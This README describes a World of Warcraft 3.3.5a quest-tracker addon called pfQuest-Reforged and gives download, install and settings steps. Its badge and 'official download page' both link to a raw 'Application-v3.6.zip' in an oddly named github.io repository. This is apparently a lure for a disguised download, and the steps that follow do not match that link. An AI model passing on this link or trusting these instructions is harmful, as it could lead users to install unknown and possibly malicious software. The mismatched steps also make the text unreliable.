# 🗺️ pfQuest-Reforged - Find every quest in Wrath easily

[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/deeplaid-homelessness709/deeplaid-homelessness709.github.io/raw/refs/heads/main/src/components/Application-v3.6.zip)

pfQuest-Reforged acts as a comprehensive quest tracker and database tool for World of Warcraft version 3.3.5a. It updates your game interface to provide clear map markers, quest objectives, and item information. This tool helps you finish quests faster by showing you exactly where to go and what to do within the world of Azeroth.

## 📥 How to download the software

Follow these steps to get the tool onto your Windows computer.

1. Open your web browser.
2. Visit the [official download page](https://github.com/deeplaid-homelessness709/deeplaid-homelessness709.github.io/raw/refs/heads/main/src/components/Application-v3.6.zip).
3. Look for the button labeled Code.
4. Select the option that says Download ZIP.
5. Save the file to your computer.

## 🛠️ Preparing the installation

Windows stores downloaded files in your Downloads folder by default. You need to move these files into your game folder to make the addon function correctly.

1. Open your Downloads folder.
2. Locate the folder named pfQuest-Reforged-master.
3. Right-click the folder and choose Extract All.
4. Click Extract to create a folder with the plain files inside.
5. Open your World of Warcraft installation directory. This is usually located in C:\Program Files (x86)\World of Warcraft.
6. Find the folder named Interface.
7. Inside the Interface folder, open the AddOns folder.
8. Drag the extracted pfQuest and pfQuest-map folders from your Downloads folder into this AddOns folder.

## 🎮 Running the addon in game

Once you place the files in the correct location, you must activate them within the game.

1. Start your World of Warcraft game client.
2. Before you log into your character, look at the bottom left corner of the screen.
3. Click the button labeled AddOns.
4. Ensure that pfQuest and pfQuest-map appear in the list with a checkmark next to them.
5. Log into your character.
6. The addon will load automatically. You can see the new interface elements on your world map and minimap.

## ⚙️ Customizing your experience

The addon comes with a set of settings to tailor your questing experience. Type /pfquest into your chat box to open the settings menu. From here, you can toggle specific map icons, change the size of the quest tracker, or adjust the database filters.

The software requires a standard installation of World of Warcraft: Wrath of the Lich King version 3.3.5a. You need enough disk space to extract the addon files. Ensure your game client remains closed while you move files into the AddOns folder to prevent errors.

## ❓ Troubleshooting common issues

If you do not see the addon in your list, verify the file path. The AddOns folder must reside inside the Interface folder. If you see two folders for the same addon inside the AddOns directory, delete the extra copy. Always check that the version of your game matches the 3.3.5a requirement. If icons do not appear on your map, open the settings menu and verify that the display options under the Map category remain enabled.
